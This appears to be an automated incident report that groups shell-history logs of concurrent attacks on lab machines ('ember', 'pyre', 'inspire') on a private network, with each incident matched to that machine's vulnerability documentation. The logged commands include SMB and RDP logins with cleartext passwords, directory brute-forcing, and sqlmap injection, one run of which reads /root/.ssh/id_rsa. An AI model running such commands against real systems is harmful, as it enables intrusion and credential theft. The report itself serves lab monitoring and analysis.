# Redone Concurrent Incident Report

**Scope**: incidents filtered to those mapped to documented vulnerabilities and involving agents from different subnet groups.

## Executive Summary
- Total filtered incidents: 82
- Top incidents shown: 10

## Top 10 Incidents (by number of entries)
### 1. ember — 12 events
- Time window: 2026-01-27T19:01:00
- Target IP: 10.100.7.46
- Entries:
- 2026-01-27T19:01:55 | logs/10.100.7.34/shell_history.csv#L64 | `nxc smb http://10.100.7.46/ u-username p-password`
- 2026-01-27T19:01:01 | logs/10.100.7.14/shell_history.csv#L309 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T19:01:13 | logs/10.100.7.14/shell_history.csv#L310 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T19:01:33 | logs/10.100.7.14/shell_history.csv#L311 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T19:01:46 | logs/10.100.7.14/shell_history.csv#L312 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T19:01:50 | logs/10.100.7.14/shell_history.csv#L313 | `smbclient //10.100.7.46/Scripts --user guest`
- 2026-01-27T19:01:55 | logs/10.100.7.14/shell_history.csv#L314 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T19:01:31 | logs/10.100.7.22/shell_history.csv#L182 | `nxc smb 10.100.7.46 -u [user] -p [password]`
- 2026-01-27T19:01:10 | logs/10.100.7.24/shell_history.csv#L254 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- 2026-01-27T19:01:20 | logs/10.100.7.24/shell_history.csv#L255 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- 2026-01-27T19:01:43 | logs/10.100.7.24/shell_history.csv#L256 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- 2026-01-27T19:01:52 | logs/10.100.7.24/shell_history.csv#L257 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- Matched vulnerability documentation:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

### 2. ember — 11 events
- Time window: 2026-01-27T19:02:00
- Target IP: 10.100.7.46
- Entries:
- 2026-01-27T19:02:00 | logs/10.100.7.34/shell_history.csv#L65 | `nxc smb http://10.100.7.46/ u-username p-password`
- 2026-01-27T19:02:05 | logs/10.100.7.32/shell_history.csv#L634 | `nxc smb 10.100.7.46 -u EMBER -p 'h3ab9pR32xd5A84VAGLS'`
- 2026-01-27T19:02:11 | logs/10.100.7.32/shell_history.csv#L635 | `nxc smb 10.100.7.46 -u EMBER -p 'h3ab9pR32xd5A84VAGLS' --shares`
- 2026-01-27T19:02:04 | logs/10.100.7.14/shell_history.csv#L315 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T19:02:13 | logs/10.100.7.14/shell_history.csv#L316 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T19:02:20 | logs/10.100.7.14/shell_history.csv#L317 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T19:02:00 | logs/10.100.7.24/shell_history.csv#L258 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- 2026-01-27T19:02:13 | logs/10.100.7.24/shell_history.csv#L259 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- 2026-01-27T19:02:16 | logs/10.100.7.24/shell_history.csv#L260 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- 2026-01-27T19:02:18 | logs/10.100.7.24/shell_history.csv#L261 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- 2026-01-27T19:02:19 | logs/10.100.7.24/shell_history.csv#L262 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- Matched vulnerability documentation:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

### 3. ember — 8 events
- Time window: 2026-01-27T19:03:00
- Target IP: 10.100.7.46
- Entries:
- 2026-01-27T19:03:16 | logs/10.100.7.11/shell_history.csv#L185 | `nxc smb 10.100.7.46 -u EMBER$ -p J4f9juEr --shares`
- 2026-01-27T19:03:50 | logs/10.100.7.32/shell_history.csv#L636 | `nxc smb 10.100.7.46 -u EMBER -p 'h3ab9pR32xd5A84VAGLS' --shares`
- 2026-01-27T19:03:49 | logs/10.100.7.14/shell_history.csv#L319 | `gobuster dir -u http://10.100.7.46 -w /usr/share/dirb/wordlists/common.txt`
- 2026-01-27T19:03:12 | logs/10.100.7.22/shell_history.csv#L184 | `nxc smb 10.100.7.46 -u guest -p`
- 2026-01-27T19:03:32 | logs/10.100.7.22/shell_history.csv#L185 | `nxc smb 10.100.7.46 -u ember -p`
- 2026-01-27T19:03:50 | logs/10.100.7.22/shell_history.csv#L186 | `nxc smb 10.100.7.46 -u ember -p "`
- 2026-01-27T19:03:10 | logs/10.100.7.24/shell_history.csv#L264 | `xfreerdp3 /u:rand2 /v:10.100.7.46 /p:dFMVxYA4`
- 2026-01-27T19:03:16 | logs/10.100.7.24/shell_history.csv#L265 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4`
- Matched vulnerability documentation:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

### 4. ember — 8 events
- Time window: 2026-01-27T19:04:00
- Target IP: 10.100.7.46
- Entries:
- 2026-01-27T19:04:28 | logs/10.100.7.34/shell_history.csv#L66 | `nxc smb 10.100.7.46 -u username -p password`
- 2026-01-27T19:04:41 | logs/10.100.7.34/shell_history.csv#L67 | `nxc smb 10.100.7.46 -u username -p password`
- 2026-01-27T19:04:41 | logs/10.100.7.34/shell_history.csv#L68 | `nxc smb 10.100.7.46 -u username -p password`
- 2026-01-27T19:04:41 | logs/10.100.7.34/shell_history.csv#L69 | `nxc smb 10.100.7.46 -u username -p password`
- 2026-01-27T19:04:03 | logs/10.100.7.32/shell_history.csv#L637 | `smbclient //10.100.7.46/Scripts --user guest`
- 2026-01-27T19:04:02 | logs/10.100.7.22/shell_history.csv#L187 | `nxc smb 10.100.7.46 -u guest -p "`
- 2026-01-27T19:04:21 | logs/10.100.7.22/shell_history.csv#L188 | `ssh guest@10.100.7.46`
- 2026-01-27T19:04:26 | logs/10.100.7.22/shell_history.csv#L189 | `ssh guest@10.100.7.46`
- Matched vulnerability documentation:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

### 5. ember — 8 events
- Time window: 2026-01-27T18:58:00
- Target IP: 10.100.7.46
- Entries:
- 2026-01-27T18:58:00 | logs/10.100.7.14/shell_history.csv#L300 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T18:58:29 | logs/10.100.7.14/shell_history.csv#L301 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T18:58:43 | logs/10.100.7.14/shell_history.csv#L302 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T18:58:53 | logs/10.100.7.14/shell_history.csv#L303 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T18:58:12 | logs/10.100.7.24/shell_history.csv#L245 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- 2026-01-27T18:58:39 | logs/10.100.7.24/shell_history.csv#L246 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- 2026-01-27T18:58:48 | logs/10.100.7.24/shell_history.csv#L247 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- 2026-01-27T18:58:59 | logs/10.100.7.24/shell_history.csv#L248 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- Matched vulnerability documentation:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

### 6. ember — 7 events
- Time window: 2026-01-27T18:59:00
- Target IP: 10.100.7.46
- Entries:
- 2026-01-27T18:59:46 | logs/10.100.7.34/shell_history.csv#L63 | `nxc smb http://10.100.7.46/ u-username p-password`
- 2026-01-27T18:59:06 | logs/10.100.7.14/shell_history.csv#L304 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T18:59:16 | logs/10.100.7.14/shell_history.csv#L305 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T18:59:25 | logs/10.100.7.14/shell_history.csv#L306 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T18:59:11 | logs/10.100.7.24/shell_history.csv#L249 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- 2026-01-27T18:59:22 | logs/10.100.7.24/shell_history.csv#L250 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- 2026-01-27T18:59:44 | logs/10.100.7.24/shell_history.csv#L251 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- Matched vulnerability documentation:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

### 7. ember — 7 events
- Time window: 2026-01-27T19:00:00
- Target IP: 10.100.7.46
- Entries:
- 2026-01-27T19:00:36 | logs/10.100.7.32/shell_history.csv#L632 | `smbclient //10.100.7.46/Scripts --user guest`
- 2026-01-27T19:00:45 | logs/10.100.7.32/shell_history.csv#L633 | `nxc smb 10.100.7.46 -u guest -p ''`
- 2026-01-27T19:00:08 | logs/10.100.7.14/shell_history.csv#L307 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T19:00:52 | logs/10.100.7.14/shell_history.csv#L308 | `xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!`
- 2026-01-27T19:00:46 | logs/10.100.7.22/shell_history.csv#L181 | `nxc smb [10.100.7.46] -u guest -p`
- 2026-01-27T19:00:33 | logs/10.100.7.24/shell_history.csv#L252 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- 2026-01-27T19:00:58 | logs/10.100.7.24/shell_history.csv#L253 | `xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!`
- Matched vulnerability documentation:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

### 8. pyre — 7 events
- Time window: 2026-02-02T19:31:00
- Target IP: 10.100.7.45
- Entries:
- 2026-02-02T19:31:06 | logs/10.100.7.32/shell_history.csv#L806 | `sqlmap -u http://10.100.7.45/panels.php?id=1""`
- 2026-02-02T19:31:21 | logs/10.100.7.32/shell_history.csv#L807 | `sqlmap -u http://10.100.7.45/panels.php?id=1" --dbs"`
- 2026-02-02T19:31:28 | logs/10.100.7.32/shell_history.csv#L808 | `sqlmap -u http://10.100.7.45/panels.php?id=1" --dbs"`
- 2026-02-02T19:31:36 | logs/10.100.7.32/shell_history.csv#L809 | `cd ~/.local/share/sqlmap/output/10.100.7.45`
- 2026-02-02T19:31:20 | logs/10.100.7.14/shell_history.csv#L413 | `sqlmap -u http://10.100.7.45/index.php?id=1" --dbs --crawl=2 --risk=3"`
- 2026-02-02T19:31:03 | logs/10.100.7.13/shell_history.csv#L297 | `curl http://10.100.7.45/index.php?id=5""`
- 2026-02-02T19:31:37 | logs/10.100.7.12/shell_history.csv#L170 | `sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/root/.ssh/id_rsa --hex"`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### 9. inspire — 6 events
- Time window: 2026-02-10T19:21:00
- Target IP: 10.100.7.48
- Entries:
- 2026-02-10T19:21:17 | logs/10.100.7.34/shell_history.csv#L79 | `nmap -sC -sV -p 22,80 10.100.7.48`
- 2026-02-10T19:21:35 | logs/10.100.7.34/shell_history.csv#L80 | `nmap -sC -sV -p 22,80 10.100.7.48`
- 2026-02-10T19:21:35 | logs/10.100.7.34/shell_history.csv#L81 | `nmap -sC -sV -p 22,80 10.100.7.48`
- 2026-02-10T19:21:35 | logs/10.100.7.34/shell_history.csv#L82 | `nmap -sC -sV -p 22,80 10.100.7.48`
- 2026-02-10T19:21:58 | logs/10.100.7.34/shell_history.csv#L83 | `gobuster dir -u http://10.100.7.48/ -w /usr/share/wordlists/dirb/common.txt`
- 2026-02-10T19:21:49 | logs/10.100.7.14/shell_history.csv#L564 | `mysql -h 10.100.7.48 -P 3306 -u inspire`
- Matched vulnerability documentation:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

### 10. ember — 5 events
- Time window: 2026-01-26T19:23:00
- Target IP: 10.100.7.46
- Entries:
- 2026-01-26T19:23:54 | logs/10.100.7.11/shell_history.csv#L166 | `gobuster dir -u 10.100.7.46 -w /usr/share/wordlists/dirb/big.txt`
- 2026-01-26T19:23:58 | logs/10.100.7.24/shell_history.csv#L148 | `nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth`
- 2026-01-26T19:23:21 | logs/10.100.7.31/shell_history.csv#L11 | `nmap 10.100.7.46 -p 445`
- 2026-01-26T19:23:52 | logs/10.100.7.31/shell_history.csv#L13 | `nxc smb 10.100.7.46`
- 2026-01-26T19:23:58 | logs/10.100.7.31/shell_history.csv#L14 | `nxc smb 10.100.7.46`
- Matched vulnerability documentation:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Full Incident Index
- Incident 1: 2026-01-27T19:01:00 | Target: ember | Events: 12
- Incident 2: 2026-01-27T19:05:00 | Target: pyre | Events: 2
- Incident 3: 2026-01-27T19:09:00 | Target: ember | Events: 3
- Incident 4: 2026-01-27T19:10:00 | Target: ember | Events: 4
- Incident 5: 2026-01-27T19:11:00 | Target: ember | Events: 2
- Incident 6: 2026-01-27T19:18:00 | Target: ember | Events: 4
- Incident 7: 2026-01-27T19:19:00 | Target: ember | Events: 2
- Incident 8: 2026-01-27T19:23:00 | Target: ember | Events: 4
- Incident 9: 2026-01-27T19:35:00 | Target: ember | Events: 2
- Incident 10: 2026-01-13T19:19:00 | Target: orbital | Events: 2
- Incident 11: 2026-01-13T19:54:00 | Target: orbital | Events: 4
- Incident 12: 2026-01-13T19:56:00 | Target: orbital | Events: 2
- Incident 13: 2026-01-13T19:58:00 | Target: orbital | Events: 4
- Incident 14: 2026-01-13T19:59:00 | Target: orbital | Events: 4
- Incident 15: 2026-01-13T20:01:00 | Target: orbital | Events: 2
- Incident 16: 2026-01-26T18:45:00 | Target: orbital | Events: 3
- Incident 17: 2026-01-26T19:23:00 | Target: ember | Events: 5
- Incident 18: 2026-01-26T19:37:00 | Target: ember | Events: 2
- Incident 19: 2026-01-27T18:52:00 | Target: ember | Events: 5
- Incident 20: 2026-01-27T18:53:00 | Target: ember | Events: 3
- Incident 21: 2026-01-27T19:03:00 | Target: ember | Events: 8
- Incident 22: 2026-01-27T19:04:00 | Target: ember | Events: 8
- Incident 23: 2026-01-27T19:17:00 | Target: ember | Events: 3
- Incident 24: 2026-02-02T19:42:00 | Target: pyre | Events: 4
- Incident 25: 2026-02-03T18:51:00 | Target: pyre | Events: 2
- Incident 26: 2026-02-03T18:56:00 | Target: pyre | Events: 4
- Incident 27: 2026-02-03T19:05:00 | Target: pyre | Events: 2
- Incident 28: 2026-02-03T19:28:00 | Target: pyre | Events: 3
- Incident 29: 2026-02-10T19:21:00 | Target: inspire | Events: 6
- Incident 30: 2026-02-10T19:56:00 | Target: orbital | Events: 3
- Incident 31: 2026-02-10T20:10:00 | Target: orbital | Events: 2
- Incident 32: 2026-02-09T18:52:00 | Target: orbital | Events: 4
- Incident 33: 2026-02-09T19:37:00 | Target: orbital | Events: 2
- Incident 34: 2026-01-12T19:54:00 | Target: orbital | Events: 2
- Incident 35: 2026-01-13T19:49:00 | Target: orbital | Events: 2
- Incident 36: 2026-01-13T20:14:00 | Target: orbital | Events: 3
- Incident 37: 2026-01-27T18:59:00 | Target: ember | Events: 7
- Incident 38: 2026-01-27T19:02:00 | Target: ember | Events: 11
- Incident 39: 2026-02-10T19:18:00 | Target: inspire | Events: 2
- Incident 40: 2026-02-10T19:26:00 | Target: inspire | Events: 3
- Incident 41: 2026-02-10T19:54:00 | Target: orbital | Events: 2
- Incident 42: 2026-02-10T19:55:00 | Target: orbital | Events: 3
- Incident 43: 2026-01-26T19:28:00 | Target: ember | Events: 2
- Incident 44: 2026-01-26T19:39:00 | Target: ember | Events: 3
- Incident 45: 2026-01-26T20:01:00 | Target: forge | Events: 2
- Incident 46: 2026-01-26T20:02:00 | Target: forge | Events: 2
- Incident 47: 2026-01-27T19:00:00 | Target: ember | Events: 7
- Incident 48: 2026-02-02T18:48:00 | Target: pyre | Events: 4
- Incident 49: 2026-02-02T19:22:00 | Target: pyre | Events: 2
- Incident 50: 2026-02-02T19:28:00 | Target: pyre | Events: 5
- Incident 51: 2026-02-02T19:31:00 | Target: pyre | Events: 7
- Incident 52: 2026-02-02T19:34:00 | Target: pyre | Events: 2
- Incident 53: 2026-02-02T19:37:00 | Target: pyre | Events: 4
- Incident 54: 2026-02-02T19:38:00 | Target: pyre | Events: 3
- Incident 55: 2026-02-02T19:39:00 | Target: pyre | Events: 2
- Incident 56: 2026-02-02T19:48:00 | Target: pyre | Events: 5
- Incident 57: 2026-02-02T19:50:00 | Target: pyre | Events: 4
- Incident 58: 2026-02-02T19:52:00 | Target: pyre | Events: 5
- Incident 59: 2026-02-02T19:54:00 | Target: pyre | Events: 3
- Incident 60: 2026-02-03T18:45:00 | Target: pyre | Events: 5
- Incident 61: 2026-02-03T18:47:00 | Target: pyre | Events: 3
- Incident 62: 2026-02-03T18:53:00 | Target: pyre | Events: 3
- Incident 63: 2026-02-03T18:54:00 | Target: pyre | Events: 3
- Incident 64: 2026-02-03T18:55:00 | Target: pyre | Events: 4
- Incident 65: 2026-02-03T19:01:00 | Target: pyre | Events: 4
- Incident 66: 2026-02-03T19:12:00 | Target: pyre | Events: 3
- Incident 67: 2026-02-03T19:31:00 | Target: pyre | Events: 4
- Incident 68: 2026-02-03T19:43:00 | Target: pyre | Events: 4
- Incident 69: 2026-02-03T19:44:00 | Target: pyre | Events: 5
- Incident 70: 2026-01-26T19:11:00 | Target: ember | Events: 4
- Incident 71: 2026-01-26T19:12:00 | Target: ember | Events: 2
- Incident 72: 2026-01-26T19:27:00 | Target: ember | Events: 4
- Incident 73: 2026-01-26T19:29:00 | Target: ember | Events: 3
- Incident 74: 2026-01-26T19:30:00 | Target: ember | Events: 2
- Incident 75: 2026-01-27T18:54:00 | Target: ember | Events: 2
- Incident 76: 2026-01-27T18:57:00 | Target: ember | Events: 3
- Incident 77: 2026-01-27T18:58:00 | Target: ember | Events: 8
- Incident 78: 2026-01-12T19:32:00 | Target: orbital | Events: 5
- Incident 79: 2026-01-12T19:48:00 | Target: orbital | Events: 2
- Incident 80: 2026-01-26T19:33:00 | Target: ember | Events: 4
- Incident 81: 2026-01-26T19:42:00 | Target: ember | Events: 4
- Incident 82: 2026-01-27T20:28:00 | Target: ember | Events: 4
